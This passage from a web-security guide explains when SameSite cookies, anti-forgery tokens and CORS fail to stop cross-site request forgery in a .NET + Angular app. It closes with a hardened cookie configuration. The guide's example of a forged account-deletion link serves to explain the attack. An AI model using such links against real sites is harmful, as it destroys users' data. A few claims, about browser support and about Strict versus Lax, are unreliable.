```

The browser must send the token (from a hidden form field or `RequestVerificationToken` header) alongside the cookie. An attacker-controlled page cannot read this token due to SOP — so even if somehow the cookie arrives, the request fails without the token.

**When SameSite=Strict isn't enough**

**1. Subdomain takeover**

`SameSite` treats `shop.com` and `evil.shop.com` as the same "site" (it uses registrable domain, not full origin). If an attacker controls any subdomain of your domain (e.g., via a dangling DNS record), they can make requests that carry your `SameSite=Strict` cookies.

**2. Legacy browsers / old cookies**

Browsers older than Chrome 80 (2020) don't support SameSite. A cookie set by a server that didn't specify SameSite defaults to `None` in old browsers. If any of your users' cookies predate your SameSite rollout, they may not have the attribute.

**3. Top-level navigation attacks**

`SameSite=Strict` blocks cookies on cross-site navigation. But some actions (e.g., a link click) are top-level navigations, not background AJAX. A `GET` endpoint that performs state changes is vulnerable via a simple link (`<a href="https://shop.com/delete-account?confirm=true">`). Use `SameSite=Lax` for navigation cookies, never perform state changes on GETs.

**4. CORS misconfiguration nullifies both**

If your CORS is broken open (A12), cookies arrive cross-origin and the anti-forgery check fails too because the attacker could read the token with an unrestricted fetch. Both defences depend on SOP being intact.

**When anti-forgery tokens aren't enough alone**

Anti-forgery tokens protect form-based state changes but:
- Don't protect GET requests (tokens are typically only checked on POST/PUT/DELETE)
- Require storing tokens securely (session or cookies) — if session is compromised, tokens are too
- Add complexity for SPAs that use Bearer tokens instead of cookies (tokens are usually not needed if you use `Authorization: Bearer` headers, which browsers don't send cross-origin)

**The pragmatic recommendation for a .NET + Angular SPA**

If using **JWT Bearer tokens** (Angular sends `Authorization: Bearer <token>` header):
- SameSite not relevant (Bearer tokens aren't cookies)
- CORS is your main protection
- Anti-forgery tokens not needed (custom headers can't be sent cross-origin without CORS allowing them)

If using **cookie auth** (cookie-based sessions):
- `SameSite=Strict` + `AllowCredentials` CORS + anti-forgery tokens for non-SPA forms
- All three layers, because each covers gaps in the others

```csharp
// Cookie auth with all three
options.Cookie.SameSite = SameSiteMode.Strict;
options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
options.Cookie.HttpOnly = true;
// + UseCors with specific origins + AllowCredentials
// + [ValidateAntiForgeryToken] on state-changing controllers
```
</details>

---
